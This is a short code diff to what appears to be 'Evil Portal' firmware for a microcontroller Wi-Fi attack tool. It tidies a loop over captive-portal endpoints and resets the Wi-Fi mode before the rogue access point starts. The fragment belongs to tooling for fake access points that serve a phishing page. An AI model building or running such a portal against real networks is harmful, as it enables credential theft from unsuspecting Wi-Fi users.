@@ -92,7 +92,7 @@ void EvilPortalAddtional::serverSetup() {
         "/redirect"
     };
 
-    for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
+    for (int i = 0; i < GET_SIZE(captiveEndpoints); i++) {
         server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
             request->send(200, "text/html", index_html);
         });
@@ -215,7 +215,7 @@ void EvilPortalAddtional::apStart() {
 
     Serial.print("[INFO] Starting AP as name: ");
     Serial.println(evilapName);
-
+    WiFi.mode(WIFI_OFF);
     WiFi.mode(WIFI_AP);
     WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
     WiFi.softAP(evilapName);
